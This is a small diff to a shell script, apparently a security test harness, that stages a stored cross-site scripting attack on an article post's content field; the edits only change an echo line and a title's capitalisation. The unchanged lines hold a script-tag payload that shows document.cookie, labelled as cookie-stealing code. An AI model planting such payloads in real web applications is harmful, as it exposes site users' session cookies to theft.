@@ -33,10 +33,9 @@ $POST_PAGE
 echo
 
 echo "=====[Stored XSS Attack to Embed Cookie Stealing Code in Content Field of Aritcle Post]====="
-echo "=====[Attack 1: Content Field of Article Post]====="
 ARTICLE_TYPE=1
 ARTICLE_POPUP="<script type='text/javascript'> alert(document.cookie);</script>"
-ARTICLE_TITLE="Cookie stealing attack on content field of article post"
+ARTICLE_TITLE="Cookie Stealing Attack on Content Field of Article Post"
 
 echo "Using article title: $ARTICLE_TITLE"
 echo "Using article content: $ARTICLE_POPUP"
